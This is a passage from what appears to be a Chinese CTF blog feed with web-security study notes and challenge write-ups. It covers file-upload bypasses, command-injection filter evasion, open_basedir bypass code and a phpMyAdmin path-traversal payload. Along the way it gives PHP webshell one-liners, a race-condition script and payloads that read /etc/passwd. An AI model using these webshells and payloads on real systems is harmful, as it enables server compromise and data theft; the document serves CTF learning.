session.post(&#39;http://127.0.0.1:7777/?a=/tmp/sess_&#39;+sessid, data=data)        if len(resp.text) != 0:   # 审查判断条件            print(resp.text)            event.clear()        else:            print(&quot;**************&quot;)if __name__ == &quot;__main__&quot; :    event = threading.Event()    with requests.session() as session:        for i in range(1, 30):            threading.Thread(target=write, args=(session,)).start()        for i in range(1, 30):            threading.Thread(target=read, args=(session,)).start()    event.set()</code></pre></div><hr><p><a href="https://www.freebuf.com/articles/web/182280.html">参考博客：https://www.freebuf.com/articles/web/182280.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2021/10/29/file-upload/"/>
    <url>/2021/10/29/file-upload/</url>
    
    <content type="html"><![CDATA[<p>文件上传相关方法/问题</p><span id="more"></span><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="前端-后端过滤"><a href="#前端-后端过滤" class="headerlink" title="前端/后端过滤"></a>前端/后端过滤</h2><h3 id="常见php后缀名"><a href="#常见php后缀名" class="headerlink" title="常见php后缀名"></a>常见php后缀名</h3><p>某些情况下绕过后缀名检测：<br>php,php3,php4,php5,phtml.pht</p><h3 id="过滤——-gt"><a href="#过滤——-gt" class="headerlink" title="[]过滤——&gt;{}"></a>[]过滤——&gt;{}</h3><h2 id="htaccess-配置文件"><a href="#htaccess-配置文件" class="headerlink" title=".htaccess 配置文件"></a>.htaccess 配置文件</h2><h3 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title=".htaccess是什么"></a>.htaccess是什么</h3><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</p><p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><h3 id="htaccess利用方法"><a href="#htaccess利用方法" class="headerlink" title=".htaccess利用方法"></a>.htaccess利用方法</h3><h4 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h4><div class="hljs code-wrapper"><pre><code>// FileMatch 参数即为文件名的正则匹配&lt;FilesMatch &quot;1&quot;&gt;      SetHandler application/x-httpd-php&lt;/FilesMatch&gt;//    1&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code></pre></div><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><div class="hljs code-wrapper"><pre><code>// 将所有以jpg为后缀的文件，按照php文件解析AddType application/x-httpd-php .jpg//filename.jpg&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code></pre></div><p><a href="https://opn90.top/2021/10/21/BUU/#MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2">例：BUU-MRCTF2020 你传你🐎呢</a></p><h2 id="user-ini-配置文件"><a href="#user-ini-配置文件" class="headerlink" title=".user.ini 配置文件"></a>.user.ini 配置文件</h2><p><img src="/2021/10/29/file-upload/1.png">  </p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><div class="hljs code-wrapper"><pre><code>//需要在同一目录下存在php文件在PHP文件解析之前/之后，包含文件---相当于在php文件中添加语句auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件auto_append_file=a.jpg  //解析后进行包含</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>如果目录下有user.ini会先去识别里面的配置。当然文档也说了，并不是所有的配置都可以识别。只有 PHP_INI_PERDIR 和 PHP_INI_USER 模式可以。auto_append_file和auto_prepend_file一个相当于在每个php文件尾加上 include(“xxxx”)，一个相当于文件头加上 include(“xxx”)其中xxx就是 auto_append_file的值。auto_append_file= 1.php如果题目在php.ini中设置了 open_basedir，那么我们就可以上传.user.ini进行修改open_basedir的值，当然条件比较苛刻。//现在回到这个题。为了利用auto_append_file，我们首先上传一个带木马的图片，接着上传.user.ini内容为 auto_append_file=“xxx” xxx为我们上传的文件名。这样就在每个php文件上包含了我们的木马文件。但是这种方式其实是有个前提的，因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。</code></pre></div><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><p>1.</p><div class="hljs code-wrapper"><pre><code> &lt;? echo &#39;123&#39;;?&gt;</code></pre></div><p>前提是开启配置参数short_open_tags=on</p><p>2.</p><div class="hljs code-wrapper"><pre><code>&lt;?=(表达式)?&gt;===&lt;?php echo(表达式)?&gt;例 &lt;?=eval($_POST[&#39;a&#39;]);?&gt;</code></pre></div><p>不需要开启参数设置</p><p>3.</p><div class="hljs code-wrapper"><pre><code>&lt;% echo &#39;123&#39;;%&gt;</code></pre></div><p>前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了</p><p>4.</p><div class="hljs code-wrapper"><pre><code>&lt;script language=&quot;php&quot;&gt;echo &#39;123&#39;;&lt;/script&gt;&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;])&lt;/script&gt;</code></pre></div><p>不需要修改参数开关，但是只能在7.0以下可用</p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><div class="hljs code-wrapper"><pre><code>image/png    GIF89A</code></pre></div><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><div class="hljs code-wrapper"><pre><code> /var/log/nginx/access.log用Burp修改User-Agent为php一句话木马将日志文件当作php解析</code></pre></div><hr><p><a href="https://www.freebuf.com/articles/web/321245.html">参考博客：https://www.freebuf.com/articles/web/321245.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web File_upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP-way</title>
    <link href="/2021/10/27/PHP-ways/"/>
    <url>/2021/10/27/PHP-ways/</url>
    
    <content type="html"><![CDATA[<p>PHP相关方法/问题</p><span id="more"></span><h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><p><a href="https://blog.csdn.net/baidu_41871794/article/details/83750615">https://blog.csdn.net/baidu_41871794/article/details/83750615</a></p><h1 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h1><h2 id="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"><a href="#前端过滤–变量名前加空格–PHP解析时先将变量的空格去除" class="headerlink" title="前端过滤–变量名前加空格–PHP解析时先将变量的空格去除"></a>前端过滤–变量名前加空格–PHP解析时先将变量的空格去除</h2><p>为什么要在num前加一个空格？</p><p>答：假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><p>PHP的字符串解析特性是什么？</p><p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）<br>【当waf不让你过的时候，php却可以让你过】</p><p>—[RoarCTF 2019]Easy Calc](<a href="https://opn90.top/2021/10/21/BUU/#RoarCTF-2019-Easy-Calc">https://opn90.top/2021/10/21/BUU/#RoarCTF-2019-Easy-Calc</a>)</p><h1 id="常见函数绕过"><a href="#常见函数绕过" class="headerlink" title="常见函数绕过"></a>常见函数绕过</h1><h2 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h2><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><p>先对单引号进行转义，再进行分段单引号闭合</p><p>escapeshellarg一把字符串转码为可以在shell 命令里使用的参数</p><p><img src="/2021/10/27/PHP-ways/escapeshellarg-1.png"></p><p>例：</p><p><img src="/2021/10/27/PHP-ways/escapeshellarg-5.png"></p><p>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p><p>经过 escapeshellarg 函数处理过的参数被拼凑成 shell 命令，并且被双引号包裹这样就会造成漏洞，这主要在于bash中双引号和单引号解析变量是有区别的</p><p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用</p><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><p>escapeshellcmd——shell 元字符转义</p><p><img src="/2021/10/27/PHP-ways/escapeshellarg-3.png"></p><h3 id="CVE-2016-10045-escapeshellarg与escapeshellcmd使用不当"><a href="#CVE-2016-10045-escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="CVE-2016-10045 escapeshellarg与escapeshellcmd使用不当"></a>CVE-2016-10045 escapeshellarg与escapeshellcmd使用不当</h3><p><img src="/2021/10/27/PHP-ways/escapeshellarg-6.png"></p><p>分析详细过程：</p><p><img src="/2021/10/27/PHP-ways/escapeshellarg-2.png"></p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">标注出处：http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p><p><a href="https://paper.seebug.org/164/">标注出处：https://paper.seebug.org/164/</a></p><hr><h1 id="命令执行（暂）"><a href="#命令执行（暂）" class="headerlink" title="命令执行（暂）"></a>命令执行（暂）</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 |</h2><p><img src="/2021/10/27/PHP-ways/pingpingping-4.png"></p><ul><li>多命令执行符<br>; 执行完前面的语句再执行后面的语句<br>| 显示后面语句的执行结果<br>|| 当前面的语句执行出错时，执行后面的语句<br>&amp; 如果前面的语句为假则执行后面的语句，前面的语句可真可假<br>&amp;&amp; 如果前面的语句为假，则直接出错，也不执行后面的语句，前面的语句只能为真  </li></ul><h2 id="查询字符过滤"><a href="#查询字符过滤" class="headerlink" title="查询字符过滤"></a>查询字符过滤</h2><div class="hljs code-wrapper"><pre><code>cat   tac  more  less  head  tail  nl  tailfsed  sort  uniq  rev  </code></pre></div><h2 id="空格-space-过滤"><a href="#空格-space-过滤" class="headerlink" title="空格(space)过滤"></a>空格(space)过滤</h2><div class="hljs code-wrapper"><pre><code>&#123;cat,flag.txt&#125;$&#123;IFS&#125;$IFS$9&lt;&lt;&gt;%0a (换行)%0d（回车）%00%09%20</code></pre></div><p>解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离</p><h2 id="系统函数过滤"><a href="#系统函数过滤" class="headerlink" title="系统函数过滤"></a>系统函数过滤</h2><div class="hljs code-wrapper"><pre><code>system()exec()passthru()shell_exec()``</code></pre></div><p>[GXYCTF2019]Ping Ping Ping](<a href="https://opn90.top/2021/10/21/BUU/#GXYCTF2019-Ping-Ping-Ping">https://opn90.top/2021/10/21/BUU/#GXYCTF2019-Ping-Ping-Ping</a>)</p><h2 id="ls过滤用dir"><a href="#ls过滤用dir" class="headerlink" title="ls过滤用dir"></a>ls过滤用dir</h2><h2 id="变量拼接"><a href="#变量拼接" class="headerlink" title="变量拼接"></a>变量拼接</h2><h2 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h2><h2 id="特殊字符的使用"><a href="#特殊字符的使用" class="headerlink" title="特殊字符的使用"></a>特殊字符的使用</h2><h5 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h5><p>ca\t 后面的\t会成为 TAB 而绕过</p><h5 id="重定向符-lt-gt"><a href="#重定向符-lt-gt" class="headerlink" title="重定向符 &lt;&gt;"></a>重定向符 &lt;&gt;</h5><p>cat&lt;&gt;flag</p><h5 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h5><p>c””at fl’’ag</p><h5 id="1、-2和"><a href="#1、-2和" class="headerlink" title="$1、$2和$@"></a>$1、$2和$@</h5><p>c$1at gh$@twf01.txt</p><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符???"></a>通配符???</h5><p>/???/?at flag</p><h5 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h5><p>`命令`和$(命令)都是执行命令的方式</p><p>echo “xx<code>pwd</code>“</p><p>echo “xx$(pwd)”</p><h2 id="linux中换行"><a href="#linux中换行" class="headerlink" title="linux中换行"></a>linux中换行</h2><h2 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a>或运算</h2><hr><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h4 id="scandir-读取目录"><a href="#scandir-读取目录" class="headerlink" title="scandir() 读取目录"></a>scandir() 读取目录</h4><h4 id="file-get-contents-highlight-file-show-source-读文件"><a href="#file-get-contents-highlight-file-show-source-读文件" class="headerlink" title="file_get_contents()/highlight_file()/show_source() 读文件"></a>file_get_contents()/highlight_file()/show_source() 读文件</h4><h4 id="localeconv-返回一包含本地数字及货币格式信息的数组"><a href="#localeconv-返回一包含本地数字及货币格式信息的数组" class="headerlink" title="localeconv() 返回一包含本地数字及货币格式信息的数组"></a>localeconv() 返回一包含本地数字及货币格式信息的数组</h4><h4 id="current-pos-函数返回数组中的当前元素-单元-默认取第一个值"><a href="#current-pos-函数返回数组中的当前元素-单元-默认取第一个值" class="headerlink" title="current()/pos() 函数返回数组中的当前元素(单元),默认取第一个值"></a>current()/pos() 函数返回数组中的当前元素(单元),默认取第一个值</h4><h4 id="array-reverse-接受数组array作为输入并返回一个单元为相反顺序的新数组"><a href="#array-reverse-接受数组array作为输入并返回一个单元为相反顺序的新数组" class="headerlink" title="array_reverse() 接受数组array作为输入并返回一个单元为相反顺序的新数组"></a>array_reverse() 接受数组array作为输入并返回一个单元为相反顺序的新数组</h4><h4 id="array-flip-交换数组的键和值"><a href="#array-flip-交换数组的键和值" class="headerlink" title="array_flip() 交换数组的键和值"></a>array_flip() 交换数组的键和值</h4><h4 id="array-rand-从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回"><a href="#array-rand-从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回" class="headerlink" title="array_rand() 从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回"></a>array_rand() 从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回</h4><h4 id="next-指向当前数组的下一个元素"><a href="#next-指向当前数组的下一个元素" class="headerlink" title="next() 指向当前数组的下一个元素"></a>next() 指向当前数组的下一个元素</h4><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h4 id="var-dump-scandir-读取根目录"><a href="#var-dump-scandir-读取根目录" class="headerlink" title="var_dump(scandir(/)) 读取根目录"></a>var_dump(scandir(/)) 读取根目录</h4><h4 id="pos-localeconv-返回一个"><a href="#pos-localeconv-返回一个" class="headerlink" title="pos(localeconv()) 返回一个."></a>pos(localeconv()) 返回一个.</h4><h4 id="show-source-array-reverse-scandir-pos-localeconv-返回当前目录下的最后一个文件"><a href="#show-source-array-reverse-scandir-pos-localeconv-返回当前目录下的最后一个文件" class="headerlink" title="show_source(array_reverse(scandir(pos(localeconv())))) 返回当前目录下的最后一个文件"></a>show_source(array_reverse(scandir(pos(localeconv())))) 返回当前目录下的最后一个文件</h4><h4 id="show-source-array-rand-array-flip-scandir-current-localeconv-随机读取文件"><a href="#show-source-array-rand-array-flip-scandir-current-localeconv-随机读取文件" class="headerlink" title="show_source(array_rand(array_flip(scandir(current(localeconv()))))) 随机读取文件"></a>show_source(array_rand(array_flip(scandir(current(localeconv()))))) 随机读取文件</h4><hr><h1 id="原生类的应用"><a href="#原生类的应用" class="headerlink" title="原生类的应用"></a>原生类的应用</h1><p><a href="https://blog.csdn.net/cjdgg/article/details/115314651">完整博客:https://blog.csdn.net/cjdgg/article/details/115314651</a></p><h2 id="PHP-原生文件操作类"><a href="#PHP-原生文件操作类" class="headerlink" title="PHP 原生文件操作类"></a>PHP 原生文件操作类</h2><h3 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h3><p>可遍历目录类</p><div class="hljs code-wrapper"><pre><code>DirectoryIterator FilesystemIterator GlobIterator </code></pre></div><h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h4><p>提供了一个用于查看文件系统目录内容的简单接口<br>该类的构造方法将会创建一个指定目录的迭代器</p><div class="hljs code-wrapper"><pre><code>创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名&lt;?php  $dir = new DirectoryIterator(&quot;/&quot;);echo $dir;</code></pre></div><hr><div class="hljs code-wrapper"><pre><code>输出全部的文件名我们还需要对$dir对象进行遍历&lt;?php $dir= new DirectoryIterator(&quot;/&quot;);foreach($dir as $f)&#123;    echo($f.&#39;&lt;br&gt;&#39;);    //echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre></div><h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>一个用于查看文件系统目录内容的简单接口<br>该类的构造方法将会创建一个指定目录的迭代器  </p><div class="hljs code-wrapper"><pre><code>//利用方法同 DirectoryIterator&lt;?php  $dir = new FilesystemIterator(&quot;/&quot;);echo $dir;&lt;?php $dir= new FilesystemIterator(&quot;/&quot;);foreach($dir as $f)&#123;    echo($f.&#39;&lt;br&gt;&#39;);    //echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre></div><h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><p>使用方法与前两个类也基本相似<br>但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径</p><div class="hljs code-wrapper"><pre><code>&lt;?php  $dir = new GlobIterator(&quot;/*flag*&quot;);echo $dir;</code></pre></div><h4 id="使用可遍历目录类绕过-open-basedir"><a href="#使用可遍历目录类绕过-open-basedir" class="headerlink" title="使用可遍历目录类绕过 open_basedir"></a>使用可遍历目录类绕过 open_basedir</h4><h5 id="使用-DirectoryIterator-类"><a href="#使用-DirectoryIterator-类" class="headerlink" title="使用 DirectoryIterator 类"></a>使用 DirectoryIterator 类</h5><p>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件  </p><div class="hljs code-wrapper"><pre><code>&lt;?php $dir = $_GET[&#39;aaa&#39;];$a = new DirectoryIterator($dir);foreach($dir as $f)&#123;    echo $f;&#125;?&gt;# payload 一句话形式$aaa = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f;&#125;</code></pre></div><h5 id="使用-GlobIterator-类"><a href="#使用-GlobIterator-类" class="headerlink" title="使用 GlobIterator 类"></a>使用 GlobIterator 类</h5><p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用配合glob://协议了</p><div class="hljs code-wrapper"><pre><code>&lt;?php $dir = $_GET[&#39;aaa&#39;];$a = new GlobIterator($dir);foreach($dir as $f)&#123;    echo $f;&#125;?&gt;# payload 一句话形式$aaa = new GlobIterator(&quot;/*&quot;);foreach($a as $f)&#123;echo $f;&#125;</code></pre></div><h3 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a>可读取文件类</h3><h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h4><p>SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取</p><div class="hljs code-wrapper"><pre><code>//读取文件的一行&lt;?php      $content = new SplFileObject(&#39;/flag&#39;);echo $content;//遍历出文件&lt;?php      $content = new SplFileObject(&#39;/flag&#39;);foreach($content as $f)&#123;    echo $f;&#125;</code></pre></div><hr><h1 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir() 绕过"></a>open_basedir() 绕过</h1><h3 id="1-原生类绕过"><a href="#1-原生类绕过" class="headerlink" title="1.原生类绕过"></a>1.原生类绕过</h3><p>仅可用于读取根目录、当前目录<br>(不清楚为什么…)</p><h5 id="使用-DirectoryIterator-类-glob-协议"><a href="#使用-DirectoryIterator-类-glob-协议" class="headerlink" title="使用 DirectoryIterator 类  + glob://协议"></a>使用 DirectoryIterator 类  + glob://协议</h5><h5 id="使用-GlobIterator-类-glob-协议"><a href="#使用-GlobIterator-类-glob-协议" class="headerlink" title="使用 GlobIterator 类  +  glob://协议"></a>使用 GlobIterator 类  +  glob://协议</h5><h3 id="2-ini-set-相对路径"><a href="#2-ini-set-相对路径" class="headerlink" title="2.ini_set() + 相对路径"></a>2.ini_set() + 相对路径</h3><p>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复</p><p><img src="/2021/10/27/PHP-ways/open-2.png"></p><h5 id="1-首先需要构造一个相对可上跳的open-basedir"><a href="#1-首先需要构造一个相对可上跳的open-basedir" class="headerlink" title="(1)首先需要构造一个相对可上跳的open_basedir"></a>(1)首先需要构造一个相对可上跳的open_basedir</h5><p>(创建目录时需注意权限问题)</p><div class="hljs code-wrapper"><pre><code>mkdir(&#39;opn&#39;);chdir(&#39;opn&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);</code></pre></div><p>这也是为什么要先创文件夹的原因，就是为了在当前目录构造可以..的ini_set</p><h5 id="2-然后每次目录操作"><a href="#2-然后每次目录操作" class="headerlink" title="(2)然后每次目录操作"></a>(2)然后每次目录操作</h5><div class="hljs code-wrapper"><pre><code>chdir(&#39;..&#39;);</code></pre></div><h5 id="3-设置根目录下的open-basedir"><a href="#3-设置根目录下的open-basedir" class="headerlink" title="(3)设置根目录下的open_basedir"></a>(3)设置根目录下的open_basedir</h5><div class="hljs code-wrapper"><pre><code>ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></pre></div><h5 id><a href="#" class="headerlink" title></a></h5><div class="hljs code-wrapper"><pre><code>mkdir(&#39;opn&#39;);chdir(&#39;opn&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);</code></pre></div><p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/">从PHP底层看open_basedir bypass – sky</a></p><h3 id="3-shell命令执行"><a href="#3-shell命令执行" class="headerlink" title="3.shell命令执行"></a>3.shell命令执行</h3><h3 id="4-symlink-软连接"><a href="#4-symlink-软连接" class="headerlink" title="4.symlink()软连接"></a>4.symlink()软连接</h3><hr><h1 id="PHP版本漏洞"><a href="#PHP版本漏洞" class="headerlink" title="PHP版本漏洞"></a>PHP版本漏洞</h1><h2 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h2><p><a href="https://www.xiinnn.com/article/e7c68814.html">https://www.xiinnn.com/article/e7c68814.html</a></p><p><a href="https://www.abelche.com/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/">https://www.abelche.com/2019/11/16/CVE/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-12613%EF%BC%89/</a></p><p><a href="https://blog.csdn.net/weixin_43872099/article/details/104128639">https://blog.csdn.net/weixin_43872099/article/details/104128639</a></p><p><img src="/2021/10/27/PHP-ways/CVE-2018-12613-1.png"></p><div class="hljs code-wrapper"><pre><code>index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></pre></div><hr>]]></content>
    
    
    
    <tags>
      
      <tag>web PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU</title>
    <link href="/2021/10/21/BUU/"/>
    <url>/2021/10/21/BUU/</url>
    
    <content type="html"><![CDATA[<p>BUU题记</p><span id="more"></span><hr><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p><img src="/2021/10/21/BUU/pingpingping-1.png"></p><div class="hljs code-wrapper"><pre><code>1|ls//index.php flag.php</code></pre></div><p>空格(space)过滤，$IFS$1 绕过 （$1改成$加其他数字貌似都行）</p><div class="hljs code-wrapper"><pre><code>1|cat$IFS$1index.php</code></pre></div><p><img src="/2021/10/21/BUU/pingpingping-3.png"></p><p>ban了较多字符，并贪婪匹配flag，尝试变量拼接</p><div class="hljs code-wrapper"><pre><code>1;a=g;cat$IFS$1fla$a.php//get flag//几种错误尝试//——*f*l*a*g*——正则匹配将其过滤，仅需改变顺序即可——1;a=fla;cat$IFS$9$ag.php1;a=f;b=l;c=a;d=g;cat$IFS$9$a$b$c$d.php</code></pre></div><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符 |"></a>管道符 |</h2><p><img src="/2021/10/21/BUU/pingpingping-4.png"></p><ul><li>多命令执行符<br>; 执行完前面的语句再执行后面的语句<br>| 显示后面语句的执行结果<br>|| 当前面的语句执行出错时，执行后面的语句<br>&amp; 如果前面的语句为假则执行后面的语句，前面的语句可真可假<br>&amp;&amp; 如果前面的语句为假，则直接出错，也不执行后面的语句，前面的语句只能为真  </li></ul><h2 id="空格-space-过滤"><a href="#空格-space-过滤" class="headerlink" title="空格(space)过滤"></a>空格(space)过滤</h2><div class="hljs code-wrapper"><pre><code>&#123;cat,flag.txt&#125;$&#123;IFS&#125;$IFS$9&lt;&lt;&gt;%0a (换行)%0d（回车）%00%09%20</code></pre></div><p>解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p><p><a href="https://blog.csdn.net/weixin_39808803/article/details/111341667">《dalao博客》：https://blog.csdn.net/weixin_39808803/article/details/111341667</a></p><h2 id="过滤bash用sh执行"><a href="#过滤bash用sh执行" class="headerlink" title="过滤bash用sh执行"></a>过滤bash用sh执行</h2><div class="hljs code-wrapper"><pre><code>//官方payload/?ip=127.0.0.1;echo$IFS\$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre></div><h2 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h2><p>内联执行将反引号内命令的输出作为输入执行</p><div class="hljs code-wrapper"><pre><code>/?ip=1;cat$IFS$1`ls`</code></pre></div><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>calc() CSS中的计算函数</p><p><img src="/2021/10/21/BUU/EasyCalc-1.png"></p><p>查看源码，一个前端过滤</p><p><img src="/2021/10/21/BUU/EasyCalc-2.png"></p><p>访问calc.php<br><img src="/2021/10/21/BUU/EasyCalc-3.png"></p><div class="hljs code-wrapper"><pre><code>//扫根目录---&gt;f1agg/calc.php/?num=var_dump(scandir(chr(47)))// 